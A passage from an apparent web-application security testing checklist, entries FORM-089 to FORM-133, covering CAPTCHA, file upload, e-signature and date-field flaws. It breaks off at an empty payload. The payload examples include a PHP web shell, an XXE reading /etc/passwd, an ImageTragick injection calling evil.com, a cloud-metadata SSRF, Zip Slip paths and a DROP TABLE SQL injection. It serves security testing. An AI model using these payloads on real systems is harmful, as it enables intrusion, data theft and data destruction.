**Test Steps:** 1. Analyze reCAPTCHA v3 behavior 2. Simulate human behavior 3. Increase score 4. Bypass bot detection

**Expected Result:** Scoring should be tamper-proof

**Payload Example:**

```
Simulate mouse movements and interactions
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Selenium / Puppeteer

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## FORM-089 — CAPTCHA CSRF
**Test Category:** Cross-Site Request Forgery · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** CAPTCHA / Bot Protection

**Test Steps:** 1. CAPTCHA page lacks CSRF 2. Pre-solve CAPTCHA 3. Include in CSRF attack 4. Bypass protection

**Expected Result:** CAPTCHA forms should have CSRF tokens

**Payload Example:**

```
CSRF with pre-solved CAPTCHA token
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## FORM-090 — Time-Based CAPTCHA Bypass
**Test Category:** Bot Detection Bypass · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** CAPTCHA / Bot Protection

**Test Steps:** 1. CAPTCHA has time limit 2. Analyze timing 3. Submit just before expiry 4. Bypass with cached solution

**Expected Result:** Timing should be server-enforced

**Payload Example:**

```
Submit at exactly timeout boundary
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## FORM-091 — Honeypot Field Bypass
**Test Category:** Bot Detection Bypass · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** CAPTCHA / Bot Protection

**Test Steps:** 1. Identify honeypot fields 2. Leave honeypot empty 3. Submit like human 4. Bypass bot detection

**Expected Result:** Honeypots should be non-obvious

**Payload Example:**

```
Identify and skip hidden trap fields
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Browser DevTools / Burp Suite

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## FORM-092 — Malicious File Upload
**Test Category:** File Upload Vulnerabilities · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** File Attachments

**Test Steps:** 1. Upload PHP/JSP/ASPX file 2. Access uploaded file 3. Execute code 4. Server compromise

**Expected Result:** Executable files should be blocked

**Payload Example:**

```
shell.php with <?php system($_GET['cmd']); ?>
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite / Weevely / Upload Scanner

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## FORM-093 — Extension Bypass - Double Extension
**Test Category:** File Upload Vulnerabilities · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** File Attachments

**Test Steps:** 1. Upload malware.php.jpg 2. Server processes as PHP 3. Execute code 4. Bypass extension check

**Expected Result:** All extensions should be validated

**Payload Example:**

```
shell.php.jpg or shell.jpg.php
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite / Upload Scanner

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## FORM-094 — Extension Bypass - Null Byte
**Test Category:** File Upload Vulnerabilities · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** File Attachments

**Test Steps:** 1. Upload file.php%00.jpg 2. Null byte truncates 3. Bypass extension check 4. Execute PHP

**Expected Result:** Null bytes should be rejected

**Payload Example:**

```
shell.php%00.jpg or shell.php\x00.png
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite / Hackvertor

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## FORM-095 — Extension Bypass - Case Variation
**Test Category:** File Upload Vulnerabilities · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** File Attachments

**Test Steps:** 1. Upload file.pHp or file.PHP 2. Bypass lowercase check 3. Execute code 4. Server compromise

**Expected Result:** Extension check should be case-insensitive

**Payload Example:**

```
shell.PhP or shell.pHP
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite / Upload Scanner

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## FORM-096 — Content-Type Bypass
**Test Category:** File Upload Vulnerabilities · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** File Attachments

**Test Steps:** 1. Upload PHP file 2. Set Content-Type: image/jpeg 3. Bypass MIME check 4. Execute code

**Expected Result:** File content should be validated

**Payload Example:**

```
PHP content with image/jpeg Content-Type
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite / Upload Scanner

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## FORM-097 — Magic Bytes Bypass
**Test Category:** File Upload Vulnerabilities · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** File Attachments

**Test Steps:** 1. Prepend image magic bytes to PHP 2. Upload file 3. Bypass signature check 4. Execute code

**Expected Result:** Full content should be analyzed

**Payload Example:**

```
GIF89a<?php system($_GET['cmd']); ?>
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite / Hexeditor

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## FORM-098 — SVG XSS Upload
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** File Attachments

**Test Steps:** 1. Upload SVG with JavaScript 2. View SVG 3. XSS executes 4. Session theft

**Expected Result:** SVG should be sanitized or blocked

**Payload Example:**

```
<svg onload=alert('XSS')></svg>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## FORM-099 — SVG XXE Attack
**Test Category:** XML External Entity · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** File Attachments

**Test Steps:** 1. Upload SVG with XXE 2. Server parses SVG 3. XXE executes 4. File disclosure

**Expected Result:** XML parsing should disable external entities

**Payload Example:**

```
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```

**Impact:** XXE -&gt; local file read / SSRF / OOB exfiltration.

**Tools:** Burp Suite / XXEinjector

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XXE

---

## FORM-100 — PDF JavaScript Execution
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** File Attachments

**Test Steps:** 1. Upload PDF with JavaScript 2. User views PDF 3. JavaScript executes 4. Malicious action

**Expected Result:** PDF JS should be stripped

**Payload Example:**

```
PDF with /JavaScript /JS (app.alert('XSS'))
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** PDF Tools / Burp Suite

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## FORM-101 — Zip Slip Vulnerability
**Test Category:** Path Traversal · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** File Attachments

**Test Steps:** 1. Upload ZIP with path traversal 2. Server extracts ZIP 3. Files written outside directory 4. Overwrite files

**Expected Result:** Extraction should validate paths

**Payload Example:**

```
ZIP entry: ../../../etc/cron.d/malicious
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Zip Slip Scanner / evilarc

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## FORM-102 — Zip Bomb DoS
**Test Category:** Denial of Service · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** File Attachments

**Test Steps:** 1. Upload zip bomb 2. Server extracts 3. Disk exhaustion 4. DoS

**Expected Result:** Extraction limits should be enforced

**Payload Example:**

```
42.zip or nested recursive archive
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Custom Zip / Burp Suite

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## FORM-103 — File Size DoS
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** File Attachments

**Test Steps:** 1. Upload extremely large file 2. Exhaust storage/memory 3. DoS 4. Service disruption

**Expected Result:** File size should be limited

**Payload Example:**

```
10GB file upload
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / curl

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## FORM-104 — File Path Traversal
**Test Category:** Path Traversal · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** File Attachments

**Test Steps:** 1. Upload with traversal filename 2. File saved outside directory 3. Overwrite system files 4. Code execution

**Expected Result:** Filenames should be sanitized

**Payload Example:**

```
filename="../../../var/www/shell.php"
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite / DotDotPwn

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## FORM-105 — ImageMagick RCE
**Test Category:** Remote Code Execution · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** File Attachments

**Test Steps:** 1. Upload malicious image 2. ImageMagick processes 3. Code executes 4. Server compromise

**Expected Result:** ImageMagick should be patched

**Payload Example:**

```
push graphic-context\nviewbox 0 0 640 480\nfill 'url(https://evil.com"|ls "-la)'
```

**Impact:** Code/command execution -&gt; full server compromise.

**Tools:** ImageTragick / Burp Suite

**References:** CWE-94; -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger; OWASP

---

## FORM-106 — Attachment IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** File Attachments

**Test Steps:** 1. Download own attachment 2. Modify attachment_id 3. Download others' files 4. Data breach

**Expected Result:** Download should verify ownership

**Payload Example:**

```
GET /attachments/victim_file_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-107 — Attachment Deletion IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** File Attachments

**Test Steps:** 1. Delete own attachment 2. Modify file_id 3. Delete others' files 4. Data destruction

**Expected Result:** Deletion should verify ownership

**Payload Example:**

```
DELETE /attachments/victim_file_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-108 — Attachment URL Enumeration
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** File Attachments

**Test Steps:** 1. Analyze attachment URL 2. Enumerate file IDs 3. Access private files 4. Data breach

**Expected Result:** URLs should be unpredictable

**Payload Example:**

```
/attachments/1 through /attachments/10000
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Intruder / ffuf

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## FORM-109 — SSRF via URL Upload
**Test Category:** Server-Side Request Forgery · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** File Attachments

**Test Steps:** 1. Upload from URL feature 2. Provide internal URL 3. Server fetches internal resource 4. SSRF

**Expected Result:** URL uploads should validate destination

**Payload Example:**

```
url=http://169.254.169.254/latest/meta-data/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / SSRFmap

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## FORM-110 — Metadata Information Leak
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** File Attachments

**Test Steps:** 1. Upload image 2. Download image 3. Extract EXIF data 4. Find GPS location or creator

**Expected Result:** Metadata should be stripped

**Payload Example:**

```
EXIF GPS coordinates or author name
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** ExifTool / Burp Suite

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## FORM-111 — Signature Data XSS
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Signature Capture

**Test Steps:** 1. Capture signature 2. Inject XSS in signature data 3. Signature rendered 4. XSS executes

**Expected Result:** Signature data should be sanitized

**Payload Example:**

```
SVG signature with <script>alert(1)</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## FORM-112 — Signature IDOR Access
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Signature Capture

**Test Steps:** 1. View own signature 2. Modify signature_id 3. View another's signature 4. Privacy violation

**Expected Result:** Signature access should verify ownership

**Payload Example:**

```
GET /api/signatures/victim_signature_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-113 — Signature Forgery via Parameter
**Test Category:** Business Logic · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Signature Capture

**Test Steps:** 1. Sign document 2. Intercept signature data 3. Modify signer identity 4. Forge signature attribution

**Expected Result:** Signer should be from session

**Payload Example:**

```
{"signature_data":"...",signer_id:"victim_id"}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## FORM-114 — Signature Replay Attack
**Test Category:** Business Logic · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Signature Capture

**Test Steps:** 1. Capture signature 2. Save signature data 3. Replay on different document 4. Forge agreement

**Expected Result:** Signatures should be document-bound

**Payload Example:**

```
Replay signature_data on new document
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## FORM-115 — Signature Canvas Manipulation
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Signature Capture

**Test Steps:** 1. Signature captured as image 2. Intercept and replace 3. Submit fake signature 4. Forged consent

**Expected Result:** Signature integrity should be verified

**Payload Example:**

```
Replace signature_image with pre-captured signature
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Image Tools

**References:** CWE-840; PortSwigger Business logic

---

## FORM-116 — Signature Timestamp Manipulation
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Signature Capture

**Test Steps:** 1. Sign with timestamp 2. Modify timestamp 3. Backdate signature 4. Fraudulent dating

**Expected Result:** Timestamps should be server-generated

**Payload Example:**

```
{"signed_at":"2020-01-01T00:00:00Z"}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## FORM-117 — Signature SVG XXE
**Test Category:** XML External Entity · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Signature Capture

**Test Steps:** 1. Signature stored as SVG 2. Inject XXE in SVG 3. Server parses 4. File disclosure

**Expected Result:** SVG parsing should disable entities

**Payload Example:**

```
SVG signature with XXE payload
```

**Impact:** XXE -&gt; local file read / SSRF / OOB exfiltration.

**Tools:** Burp Suite / XXEinjector

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XXE

---

## FORM-118 — Empty Signature Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Signature Capture

**Test Steps:** 1. Signature required 2. Submit empty signature 3. Bypass requirement 4. Unsigned agreement

**Expected Result:** Non-empty signature should be required

**Payload Example:**

```
Submit empty signature_data field
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## FORM-119 — Signature CSRF
**Test Category:** Cross-Site Request Forgery · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Signature Capture

**Test Steps:** 1. Create malicious page 2. Auto-submit signature 3. User visits page 4. Signature without consent

**Expected Result:** Signature should require CSRF protection

**Payload Example:**

```
<form action="/sign/document" method="POST">
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## FORM-120 — Signature Verification Bypass
**Test Category:** Business Logic · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Signature Capture

**Test Steps:** 1. Document requires valid signature 2. Manipulate verification 3. Accept invalid signature 4. Process unsigned document

**Expected Result:** Verification should be server-side

**Payload Example:**

```
Modify is_valid_signature response to true
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## FORM-121 — Signature Storage Encryption Bypass
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Signature Capture

**Test Steps:** 1. Signatures stored encrypted 2. Find encryption key 3. Decrypt signatures 4. Access all signatures

**Expected Result:** Encryption keys should be secure

**Payload Example:**

```
Exposed encryption key in client code
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Browser DevTools / Burp Suite

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## FORM-122 — Date Validation Bypass
**Test Category:** Input Validation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Date / Time Picker

**Test Steps:** 1. Date picker limits range 2. Intercept request 3. Submit out-of-range date 4. Bypass restriction

**Expected Result:** Server should validate date range

**Payload Example:**

```
{"birth_date":"1800-01-01"} or {"date":"2999-12-31"}
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite / Postman

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## FORM-123 — Future Date Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Date / Time Picker

**Test Steps:** 1. Past date required 2. Submit future date 3. Bypass restriction 4. Invalid data accepted

**Expected Result:** Future dates should be rejected if required

**Payload Example:**

```
{"expiry_date":"2025-01-01"} for past-only field
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## FORM-124 — Date Format Manipulation
**Test Category:** Input Validation · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Date / Time Picker

**Test Steps:** 1. Expected date format 2. Submit different format 3. Parsing error or bypass 4. Unexpected behavior

**Expected Result:** Multiple formats should be handled

**Payload Example:**

```
2024-01-01 vs 01/01/2024 vs Jan 1 2024
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite / Postman

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## FORM-125 — SQL Injection via Date
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Date / Time Picker

**Test Steps:** 1. Date used in query 2. Inject SQL in date field 3. Execute SQL 4. Data extraction

**Expected Result:** Date fields should be parameterized

**Payload Example:**

```
date=2024-01-01'; DROP TABLE users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## FORM-126 — Timezone Manipulation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Date / Time Picker

**Test Steps:** 1. Date has timezone 2. Modify timezone 3. Bypass time-based restrictions 4. Access outside allowed time

**Expected Result:** Timezone should be server-controlled

**Payload Example:**

```
{"datetime":"2024-01-01T00:00:00-12:00"} to shift time
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## FORM-127 — Date XSS Injection
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Date / Time Picker

**Test Steps:** 1. Date displayed on page 2. Inject XSS as date 3. XSS rendered 4. Script execution

**Expected Result:** Date display should be sanitized

**Payload Example:**

```
date=<script>alert(1)</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## FORM-128 — Leap Year/Month Boundary Bypass
**Test Category:** Input Validation · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Date / Time Picker

**Test Steps:** 1. Enter invalid date like Feb 30 2. Check validation 3. Exploit boundary handling 4. System error

**Expected Result:** Invalid dates should be rejected

**Payload Example:**

```
{"date":"2024-02-30"} or {"date":"2024-13-01"}
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite / Postman

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## FORM-129 — Unix Timestamp Overflow
**Test Category:** Input Validation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Date / Time Picker

**Test Steps:** 1. Date as Unix timestamp 2. Submit extreme value 3. Integer overflow 4. Unexpected behavior

**Expected Result:** Timestamp bounds should be checked

**Payload Example:**

```
timestamp=9999999999999999999
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite / Postman

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## FORM-130 — Negative Date/Time Value
**Test Category:** Input Validation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Date / Time Picker

**Test Steps:** 1. Submit negative date value 2. Check handling 3. Bypass validation 4. Unexpected behavior

**Expected Result:** Negative values should be handled

**Payload Example:**

```
{"year":-1} or {"timestamp":-1}
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite / Postman

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## FORM-131 — Date Range Overlap Exploitation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Date / Time Picker

**Test Steps:** 1. Booking system with dates 2. Submit overlapping range 3. Double book 4. Resource conflict

**Expected Result:** Overlapping ranges should be prevented

**Payload Example:**

```
Book same room for overlapping dates
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-840; PortSwigger Business logic

---

## FORM-132 — Scheduling Time Manipulation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Date / Time Picker

**Test Steps:** 1. Schedule for future time 2. Modify to past time 3. Bypass scheduling 4. Immediate execution

**Expected Result:** Past scheduling should be rejected

**Payload Example:**

```
{"scheduled_at":"2020-01-01T00:00:00Z"}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## FORM-133 — Address Autocomplete XSS
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Address Autocomplete

**Test Steps:** 1. Type address 2. Autocomplete with XSS in suggestion 3. XSS in dropdown 4. Execute on select

**Expected Result:** Autocomplete results should be sanitized

**Payload Example:**

```
